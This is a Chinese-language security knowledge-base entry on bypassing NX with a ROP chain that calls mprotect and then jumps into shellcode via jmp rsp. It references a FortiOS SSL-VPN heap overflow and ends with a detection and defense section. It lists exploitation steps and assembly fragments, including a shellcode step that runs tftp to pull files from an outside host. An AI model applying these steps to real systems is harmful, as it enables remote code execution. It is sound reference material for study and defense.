---
id: rop-mprotect-jmprsp-shellcode-transition
title: NX 且 gadget 不足时用 ROP 调 mprotect 再 jmp rsp 切换执行 shellcode
type: scenario
domain: binary
path: binary/pwn/rop
technique: ROP→shellcode 迁移
tags:
- rop
- mprotect
- nx-bypass
- shellcode
- pwn
severity: high
confidence: high
status: draft
created: '2026-11-08'
updated: '2026-11-08'
url: /docs/binary/pwn/rop/rop-mprotect-jmprsp-shellcode-transition/
draft: false
kb_aliases:
- mprotect jmp rsp
- ROP 转 shellcode
---

# NX 且 gadget 不足时用 ROP 调 mprotect 再 jmp rsp 切换执行 shellcode

## 一句话结论

当溢出可用空间有限、gadget 不够拼完整参数调用（如 execl 多参数、URL 字符串超 8 字节）且栈不可执行时，先用短 ROP 链调用 `mprotect` 把溢出点所在的 rw-p 栈段改成 RWX（prot=7），再以 `jmp rsp`/`jmp rax` 跳入紧跟其后的 shellcode，把"受限 ROP"升级为"任意长度 shellcode"。

## 原理

mprotect(addr,len,prot) 只需 rdi/rsi/rdx 三个寄存器，两三个 pop gadget 即可布参；溢出发生在栈上时，`info proc mappings` 里溢出地址必然落在某个 rw-p 段内，用溢出地址减段基址得到负偏移（如 0xffffffffffea5288），配合 `add rdx,rax; ...` 型 gadget 或直接以残存寄存器值（rdx 上常残留与栈相关的差值）凑出段基址。mprotect 成功后内存可执行，`jmp rsp` 落在 ROP 链尾部，紧随其后的 shellcode 即被执行；若 shellcode 区仍受限，可在 shellcode 开头 `lea rax,[rip+N]; jmp rax` 把执行流迁移到 payload 尾部（0x620+8 位置）获得近乎无限长度空间。

## 触发条件

- 存在栈/堆溢出且可控制返回地址与后续 0xc0~0x100 字节左右的连续数据；
- 目标进程 NX 开启、无 PIE 或已知模块基址（可从同版本调试环境抄 gadget）；
- 内存布局中溢出点属于 rw-p 段且 mprotect 可调用（libc/system 库加载）。

## 利用步骤

1. gdb `info proc mappings` 确认溢出地址所在 rw-p 段（如 0x7ff1e0f42000-0x7ff1e11c2000，0x280000 大小），计算偏移。
2. 布参：`pop rdi; ret`（或 push rdx;pop rdi 复用残存值）→段基址；`pop rsi; ret`→长度(0x200000)；`pop rdx; ret`→7；`call mprotect`。
3. ROP 尾部放 `jmp rsp`，紧接第一段短 shellcode：`sub rsp,0x1000; lea rax,[rip+0x69]; jmp rax` 完成栈调整与长跳转。
4. 尾部空间写完整 shellcode：逐参 push 构造 execl/execve 参数（超过 8 字节的字符串分两次 movabs+push），最后 call execl（如 `/bin/tftp 192.168.111.148 1.js get octet` 下载文件）。
5. 执行后验证文件落地/回连。

## PoC

无 PoC（构造要点如上；原文在 FortiOS SSL-VPN 堆溢出场景验证：mprotect(0x7ff1e0f42000,0x200000,7) 后 `info proc mappings` 出现 rwxp 段，jmp rsp 接 shellcode 调 execl 成功经 tftp 下载 busybox 与 js 文件）。

## 变体与关联

- 变体：无合适 call mprotect gadget 时直接 `mov eax,0xa; syscall`（需 r10 作第四参）；`jmp rsp` 可换 `jmp rax`/`call rsp`；read 系统调用二次读入更长 payload（受限于 syscall 后 gdb 行为异常时改用 rip 迁移）。
- 关联：FortiOS SSL-VPN 堆溢出未认证 RCE（本技术的实战载体）；write-what-where 场景同样适用。

## 检测与防御

- 检测：进程内存出现新增 rwxp 段、栈段执行位变更（ptrace/ETW/auditd mprotect 监控）、异常 Content-Length 后跟随内存保护修改。
- 防御：内核级栈可执行位加固（如 smap/smep、CET）、库函数地址随机化（PIE+ASLR 强度）、对 mprotect+跳转序列的行为告警。
